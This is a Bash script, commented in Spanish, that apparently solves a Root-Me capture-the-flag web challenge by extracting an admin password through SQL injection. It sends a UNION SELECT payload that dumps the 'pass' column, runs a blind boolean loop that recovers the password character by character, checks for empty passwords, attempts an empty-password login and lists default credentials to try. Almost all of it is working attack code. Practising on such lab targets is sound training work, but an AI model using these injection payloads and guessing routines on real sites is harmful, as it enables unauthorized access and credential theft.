#!/bin/bash

# ================================================
# EXTRAER CONTRASEÑA REAL - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  EXTRAER CONTRASEÑA REAL${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# MÉTODO 1: UNION SELECT para mostrar pass
# ============================================

echo -e "\n${YELLOW}[+] Método 1: UNION SELECT para mostrar pass${NC}"

result=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,CONCAT('###',pass,'###'),3,4 FROM membres#" \
    | grep -o "###.*###" | sed 's/###//g')

if [ -n "$result" ]; then
    echo -e "${GREEN}✅ Contraseña encontrada: $result${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
    echo -e "${GREEN}  Usuario: admin${NC}"
    echo -e "${GREEN}  Contraseña: $result${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
else
    echo -e "${RED}❌ No se encontró contraseña en membres${NC}"
fi

# ============================================
# MÉTODO 2: Inyección booleana para extraer pass
# ============================================

echo -e "\n${YELLOW}[+] Método 2: Inyección booleana para extraer pass${NC}"

PASSWORD=""
CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

for pos in {1..20}; do
    found=0
    for ((i=0; i<${#CHARS}; i++)); do
        char="${CHARS:$i:1}"
        response=$(curl -s "$URL?action=membres&id=1' AND SUBSTRING(pass,$pos,1)='$char" 2>/dev/null | grep -c "admin")
        if [ "$response" -gt 0 ]; then
            PASSWORD="${PASSWORD}${char}"
            echo -e "${GREEN}[✓] Posición $pos: '$char'${NC}"
            found=1
            break
        fi
    done
    if [ $found -eq 0 ]; then
        break
    fi
done

if [ -n "$PASSWORD" ]; then
    echo -e "\n${GREEN}========================================${NC}"
    echo -e "${GREEN}  CONTRASEÑA: $PASSWORD${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
else
    echo -e "${RED}❌ No se encontró contraseña con booleana${NC}"
fi

# ============================================
# MÉTODO 3: Verificar si la contraseña está vacía
# ============================================

echo -e "\n${YELLOW}[+] Método 3: Verificar si la contraseña está vacía${NC}"

# Verificar si pass es NULL
null_check=$(curl -s "$URL?action=membres&id=1' AND pass IS NULL" 2>/dev/null | grep -c "admin")
empty_check=$(curl -s "$URL?action=membres&id=1' AND pass=''" 2>/dev/null | grep -c "admin")

if [ "$null_check" -gt 0 ] || [ "$empty_check" -gt 0 ]; then
    echo -e "${YELLOW}⚠️  La contraseña está vacía o NULL${NC}"
    echo -e "${YELLOW}[!] Intenta autenticar con contraseña vacía${NC}"
    
    auth=$(curl -s -X POST "$URL" -d "username=admin&password=" | grep -c "login failed")
    if [ "$auth" -eq 0 ]; then
        echo -e "${GREEN}✅ ¡AUTENTICACIÓN EXITOSA!${NC}"
        echo -e "${GREEN}  Usuario: admin${NC}"
        echo -e "${GREEN}  Contraseña: (vacía)${NC}"
        exit 0
    fi
else
    echo -e "${RED}❌ La contraseña no está vacía${NC}"
fi

# ============================================
# SI NADA FUNCIONA
# ============================================

echo -e "\n${RED}========================================${NC}"
echo -e "${RED}  NO SE PUDO EXTRAER LA CONTRASEÑA${NC}"
echo -e "${RED}========================================${NC}"

echo -e "\n${YELLOW}[!] Posibles explicaciones:${NC}"
echo -e "  1. La columna 'pass' no existe en la tabla real"
echo -e "  2. La contraseña está en otra tabla o base de datos"
echo -e "  3. El login usa un sistema de autenticación externo"

echo -e "\n${YELLOW}[!] Prueba a autenticar con estas credenciales comunes:${NC}"
echo -e "  admin / admin"
echo -e "  admin / password"
echo -e "  admin / 123456"
echo -e "  admin / admin123"

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN${NC}"
echo -e "${BLUE}========================================${NC}"
